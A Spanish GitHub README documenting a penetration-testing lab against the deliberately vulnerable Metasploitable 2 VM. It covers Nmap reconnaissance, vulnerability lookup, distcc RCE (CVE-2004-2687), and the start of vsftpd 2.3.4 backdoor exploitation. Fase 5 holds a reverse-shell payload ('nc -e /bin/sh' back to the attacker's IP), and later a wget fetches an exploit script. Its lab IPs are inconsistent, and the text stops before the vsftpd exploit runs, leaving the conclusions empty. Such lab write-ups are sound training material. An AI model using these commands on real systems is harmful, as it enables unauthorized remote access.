# Laboratorio-Nmap-a-RCE--Metasploitable
Este laboratorio busca poner en práctica técnicas y herramientas de reconocimiento, escaneo y explotación en una máquina virtual vulnerable (Metasploitable 2), recreando el proceso de un test de penetración real dentro de un entorno seguro y controlado.

Metasploitable 2 es una máquina virtual Linux creada por Rapid7 con fines educativos, diseñada intencionalmente con múltiples vulnerabilidades. Su objetivo es permitir el entrenamiento en seguridad ofensiva de manera legal y ética, ya que incluye numerosos servicios desactualizados y configuraciones inseguras expuestas deliberadamente.

# Objetivos
- Identificar hosts activos en la red usando herramientas de reconocimiento activo
- Mapear puertos, servicios y versiones del objetivo con Nmap
- Detectar vulnerabilidades conocidas usando NSE y Searchsploit
- Explotar la vulnerabilidad CVE-2004-2687 (distcc) para obtener ejecución remota de código (RCE)
- Establecer una shell inversa interactiva en el sistema comprometido.
- Explotar la vulnerabilidad CVE-2011-2523 en vsFTPd 2.3.4 (backdoor) para conseguir acceso con privilegios de root.

# Herramientas Usadas

| Herramienta       | Propósito                                         |
|-------------------|---------------------------------------------------|
| Nmap / Zenmap     | Escaneo de puertos, versiones y vulnerabilidades  |
| NSE               | Scripts de detección y explotación                | 
| Searchsploit      | Búsqueda de exploits en base de datos local       |
| Netcat            | Listener para reverse shell                       | 
| vsFtpdBackdoor.py | Exploit para CVE-2011-2523                        |
| Python            | Upgrade de shell básica a interactiva             |

# Advertencia ética
[!WARNING]
> ⚠️ Todas las técnicas demostradas en este laboratorio se realizaron en un entorno completamente controlado y aislado, sobre una máquina virtual diseñada específicamente para este propósito. El uso de estas técnicas sobre sistemas sin autorización explícita es ilegal y va en contra de la ética profesional en ciberseguridad. Este documento tiene fines exclusivamente educativos.

# Estructua del Informe
- [Entorno de Laboratorio](#entorno-de-laboratorio)
- [Fase 1: Reconocimiento de Red](#fase-1-reconocimiento-de-red)
- [Fase 2: Escaneo con Nmap / Zenmap](#fase-2-escaneo-con-nmap--zenmap)
- [Fase 3: Identificación de Vulnerabilidades](#fase-3-identificacion-de-vulnerabilidades)
- [Fase 4: Explotación distcc CVE-2004-2687](#fase-4-explotacion-distcc-cve-2004-2687)
- [Fase 5: Reverse Shell](#fase-5-reverse-shell)
- [Fase 6: Explotación vsFTPD 2.3.4 CVE-211](#fase-6-explotacion-vsftpd-234-cve-211)
- [Conclusiones y lecciones aprendidas](#conclusiones-y-lecciones-aprendidas)

# Entorno de Laboratorio 
|Rol|Sistema Operativo|IP|
|-|-|-|
|Atacante|Kali Linux|192.168.25.143|
|Objetivo|Metasploitable 2|192.168.25.142|
<img width="809" height="711" alt="image" src="https://github.com/user-attachments/assets/e44d1892-16e2-481e-a134-e58b60cc92b3" />
<img width="733" height="351" alt="image" src="https://github.com/user-attachments/assets/3e8ff222-eb01-4a8e-a381-fef01bc79d1a" />

Verificación de conectividad:
```bash
ping -c 3 192.168.179.133
```
<img width="525" height="217" alt="image" src="https://github.com/user-attachments/assets/580ff861-7078-4a1d-b5c5-a7c97e746c13" />

# Fase 1: Reconocimiento de Red
El reconocimiento activo consiste en enviar paquetes a la red para descubrir qué hosts están activos, sin aún analizar sus servicios. Se usaron dos herramientas complementarias:

netdiscover trabaja a nivel de capa 2 (ARP), preguntando "¿quién tiene esta IP?" a toda la red. Es muy sigiloso porque usa tráfico que cualquier dispositivo genera normalmente.

nmap -sn realiza un ping sweep a nivel de capa 3 (ICMP), confirmando qué hosts responden sin escanear puertos.

Se ejecutará:
```bash
netdiscover -r 192.168.25.142/24
nmap -sn 192.168.25.142/24 | grep "Nmap scan report for"
```
<img width="731" height="567" alt="image" src="https://github.com/user-attachments/assets/893857d1-1c68-40cc-b53c-ea2d7b697b0e" />

Conclusión: El host objetivo 192.168.124.133 está activo y accesible desde nuestra máquina atacante.

# Fase 2: Escaneo con Nmap / Zenmap
## 2.1 Detección de sistema operativo
```bash
nmap -O 192.168.124.133
```
<img width="698" height="708" alt="image" src="https://github.com/user-attachments/assets/ef3de4ef-0f37-4179-ba30-087f16ae0d0e" />

Nmap identificó el objetivo como Linux 2.6.9 – 2.6.33, un kernel antiguo que confirma la naturaleza vulnerable de Metasploitable 2.

## 2.2 Detección de versiones -- top 1000 puertos
```bash
nmap -sV 192.168.124.133
```

<img width="899" height="680" alt="image" src="https://github.com/user-attachments/assets/d5b6b078-0a1c-4bc5-9cc3-495f92ca6701" />

Se identificaron 23 servicios activos con sus versiones exactas. Versiones destacadas:
|Puerto|Servicio|Versión|
|-|-|-|
|21/tcp|FTP|vsftpd 2.3.4|
|22/tcp|SSH|OpenSSH 4.7p1|
|80/tcp|HTTP|Apache 2.2.8|
|3306/tcp|MySQL|5.0.51a|
|5432/tcp|PostgreSQL|8.3.0 - 8.3.7|

## 2.3 Escaneo completo -- 65535 puertos
```bash
nmap -sV 192.168.124.133 -p-
```
<img width="929" height="696" alt="image" src="https://github.com/user-attachments/assets/ae326753-6dbe-4b5c-aadf-a1ef46078162" />

El escaneo completo reveló 6 puertos adicionales no presentes en el top 1000, siendo el más relevante:
|Puerto|Servicio|Versión|
|-|-|-|
|3632/tcp|distccd|distcc v1 (GNU) 4.2.4|
⚠️ El puerto 3632 (distcc) no aparece en el escaneo por defecto de Nmap. Solo es visible con -p-. Este servicio será el vector de ataque principal en la Fase 4.

## 2.4 Escaneo de puertos específicos y exportación de resultados

```bash
nmap -sV -p21,80 192.168.124.133
nmap -sV -p21,80 192.168.124.133 -oA results
ls results.*
```
<img width="754" height="508" alt="image" src="https://github.com/user-attachments/assets/d6a93cd4-19b2-42fc-9772-58a95ee232bd" />
Nmap permite enfocar el escaneo en puertos concretos con -p y exportar los resultados en tres formatos simultáneamente con -oA:
|Archivo|Formato|Uso|
|-|-|-|
|results.nmap|Texto legible|Revisión manual|
|results.nmap|Grepable|Procesado con scripts|
|results.xml|XML estructurado|Input para otras herramientas|
 
## 2.5 Escaneo intensibo con Zenmap
```bash
nmap -T4 -A -v 192.168.25.142
```
<img width="1365" height="729" alt="image" src="https://github.com/user-attachments/assets/300351c5-828d-497b-ad5b-df27c10e2461" />

El flag *-A* combina cuatro técnicas en un solo comando:

|Flag|Función|
|-|-|-|
|-O|Detección de sistema operativo|
|-sV|Detección de versión de servicios|
|-sC|Ejecución de scripts NSE por defecto|
|--traceroute|Trazado de ruta al objetvio|
El flag *-T4* establece el nivel de velocidad (escala 0-5), acelerando el escaneo a costa de mayor visibilidad en la red.
Hallazgos adicionales revelados por los scripts NSE automáticos:
- FTP anónimo habilitado en vsftpd 2.3.4
- SMB sin firma digital (message_signing: disabled)
- SSLv2 soportado en SMTP (protocolo obsoleto y vulnerable)
- Hostname: metasploitable.localdomain
  
# Fase 3: Identificación de Vulnerabilidades (NSE y Searchsploit)
## 3.1 Searchsploit con output de Nmap
Searchsploit puede leer directamente el XML generado por Nmap y buscar exploits conocidos para cada servicio detectado:
```bash
searchsploit -x --nmap results.xml
```
<img width="1365" height="595" alt="image" src="https://github.com/user-attachments/assets/1a370be2-17c3-45ba-907f-b9703b049a3f" />
Para vsftpd 2.3.4 se encontraron dos exploits directamente relevantes:
|Exploit|Path|
|-|-|
|vsftpd 2.3.4 – Backdoor Command Execution|unix/remote/49757.py|
|vsftpd 2.3.4 – Backdoor Command Execution (Metasploit)|unix/remote/17491.rb|

## 3.2 NSE con scripts de vulnerabilidad
El NSE (Nmap Scripting Engine) permite ejecutar scripts especializados en Lua directamente desde Nmap. El flag *--script vuln* carga todos los scripts de la categoría "vuln", que verifican activamente si cada servicio es explotable.
```bash
nmap -sV -p53,6000,111,139,25,23,21,22,445,514,513,512,80,\
1524,1099,2121,3306,3632,5432,5900,2049,6200,6667,6697,\
8009,8180,8787 --script vuln 192.168.25.142
```
<img width="1365" height="717" alt="image" src="https://github.com/user-attachments/assets/da40500e-eb9a-4790-b465-392d09e7ec70" />
## Vulnerabilidades críticas confirmadas
|Puerto|Servicio|CVE|CVSS|Estado|
|-|-|-|-|-|
|21/tcp|vsftpd 2.3.4|CVE-2011-2523|10.0|VULNERABLE|
|3632/tcp|distccd v1|CVE-2004-2687|9.3|VULNERABLE|
|1099/tcp|Java RMI| |Alta|VULNERABLE|
|5432/tcp|PostgreSQL|CVE-2014-0224|Alta|VULNERABLE|
|25/tcp|SMTP|CVE-2014-3566|Media|Vulnerable|

## Detalle: distcc CVE-2004-2687
El script NSE *distcc-cve2004-2687* confirmó que el servicio distcc en el puerto 3632 permite ejecutar comandos arbitrarios de forma remota sin autenticación. La prueba de concepto interna ejecutó *id* y obtuvo respuesta:
```bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
Esto confirma ejecución remota de código (RCE) con el usuario daemon. Este será el vector de ataque principal en la Fase 4.
<img width="639" height="272" alt="image" src="https://github.com/user-attachments/assets/ae2acfaa-f11a-436a-80d7-e99d2244a3b0" />

# Fase 4: Explotación distcc CVE-2004-2687
## ¿Qué es distcc y por qué es vulnerable?
distcc es un sistema de compilación distribuida que permite a servidores remotos compilar código C/C++ enviado por clientes. La vulnerabilidad CVE-2004-2687 existe porque versiones anteriores a la 3.1 no validan ni autentican los comandos recibidos, permitiendo que cualquier cliente remoto ejecute comandos arbitrarios en el servidor disfrazándolos de tareas de compilación.
- Divulgación 2002-02-01
- CVSSv2: 9.3 (HIGH)
- Vector: AV:N/AC:M/Au:N — Red, sin autenticación requerida
## 4.1 Localizar e inspeccionar el script NSE
```bash
locate distcc-cve2004-2687.nse
mousepad /usr/share/nmap/scripts/distcc-cve2004-2687.nse
```
El script documenta su uso interno:
```bash
nmap -p 3632 <ip> --script distcc-exec \
  --script-args="distcc-exec.cmd='id'"
```
## 4.2 Verificación de RCE con ifconfig
Se ejecutó el comando ifconfig en la máquina víctima de forma remota usando el script NSE:
```bash
nmap -p 3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='ifconfig'" \
  192.168.25.142
```
El output devuelto por Metasploitable confirmó ejecución remota:
```bash
eth0  inet addr:192.168.124.133  Bcast:192.168.124.255
      Mask:255.255.255.0
```
<img width="1358" height="659" alt="image" src="https://github.com/user-attachments/assets/c8351f50-ff3c-4074-a168-a672f3926326" />

# Fase 5: Reverse Shell
## Concepto 
Una reverse shell invierte la dirección de la conexión. En lugar de que el atacante se conecte a la víctima, es la víctima quien se conecta al atacante. Esto permite evadir firewalls que bloquean conexiones entrantes pero permiten las salientes.

El ataque requiere dos componentes simultáneos:
- Un listener en Kali esperando la conexión entrante
- Un payload ejecutado en la víctima via distcc que inicia la conexión
## 5.1 Preparar el listener
```bash
nc -nlvp 4444
```
|Flag|Significado|
|-|-|
|-n|No resolver DNS|
|-l|Modo escucha (listen)|
|-v|Verbose --mostrar conexiones|
|-p|Puerto a escuchar|
## 5.2 Ejecutar el payload via distcc
```bash
nmap -p 3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 192.168.124.128 4444'" \
  192.168.124.133
```
El comando *nc -e /bin/sh* ordena a netcat que ejectute */bin/sh* y conecte su entrada/salida a nuestra IP y puerto .
## 5.3 Conexión establecida
```bash
connect to [192.168.124.128] from (UNKNOWN) [192.168.124.133] 35902
```
<img width="1365" height="717" alt="image" src="https://github.com/user-attachments/assets/9de97f0d-bb9a-474d-94e1-7647c6ecc88e" />

# Fase 6: Explotación vsFTPD 2.3.4 CVE-211
## ¿Qué es este backdoor?
En 2011, un atacante desconocido comprometió el repositorio oficial de vsFTPd e introdujo un backdoor en la versión 2.3.4. El mecanismo es simple: si el nombre de usuario contiene la cadena *:)* durante el login FTP, el servidor abre automáticamente una shell en el puerto 6200 con privilegios de root. Fue descubierto y removido rápidamente, pero Metasploitable lo incluye intencionalmente.
- CVE: CVE-2011-2523
- CVSS: 10.0 (máximo)
- Privilegios obtenidos: root (uid=0)
## 6.1 Descargar y preparar el exploit 
```bash
wget https://gist.githubusercontent.com/thaisingle/e2af5a83f06dc91\
fdf60faa23f43ffec/raw/ba8505125ccd2f9ae30c56903f2e817aa96b1854/\
vsFtpdBackdoor.py

chmod +x vsFtpdBackdoor.py
```
# Conclusiones y lecciones aprendidas
